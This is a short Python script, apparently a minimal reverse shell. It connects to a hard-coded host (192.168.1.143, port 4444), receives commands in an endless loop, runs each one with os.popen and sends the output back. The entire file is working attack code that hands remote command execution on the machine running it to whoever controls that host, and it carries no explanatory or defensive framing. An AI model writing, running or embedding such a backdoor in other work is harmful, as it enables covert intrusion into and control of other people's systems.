import os 
import socket 
import subprocess

def connector():

    s = socket.socket()
    host = "192.168.1.143"
    port = 4444
    s.connect((host,port))

    while True :

        command = s.recv(1024)
        command = command.decode()
        stream = os.popen(command)
        output = str(stream.read())
        s.send(output.encode())
        

def main():

    connector()




if __name__ == "__main__":

    main()